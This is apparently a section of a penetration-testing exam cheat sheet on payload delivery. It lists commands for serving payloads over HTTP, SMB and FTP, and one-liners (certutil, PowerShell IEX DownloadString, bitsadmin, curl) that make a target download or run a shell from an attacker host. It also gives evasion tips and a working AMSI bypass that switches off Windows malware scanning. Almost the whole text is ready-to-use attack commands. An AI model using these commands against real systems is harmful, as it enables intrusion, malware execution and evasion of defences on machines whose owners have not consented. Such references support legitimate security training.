# 7. Payload Delivery Tactics

## Hosting & serving

`# HTTP server
python3 -m http.server 80
php -S 0.0.0.0:80

# SMB server (Windows targets)
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -user u -password p

# FTP
python3 -m pyftpdlib -p 21 -w`

## Target pulls payload

`# Windows
certutil -urlcache -split -f http://<ip>/shell.exe shell.exe
powershell IEX(New-Object Net.WebClient).DownloadString('http://<ip>/r.ps1')
powershell Invoke-WebRequest http://<ip>/shell.exe -OutFile shell.exe
curl http://<ip>/shell.exe -o shell.exe
bitsadmin /transfer j http://<ip>/shell.exe C:\Windows\Temp\shell.exe`

## Evasion (exam-relevant)

- Prefer callback ports 443/80/53
- Drop to writable dirs: `C:\Windows\Temp`, `C:\Users\Public`, `/tmp`, `/dev/shm`
- If needed (and appropriate), AMSI bypass:

`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`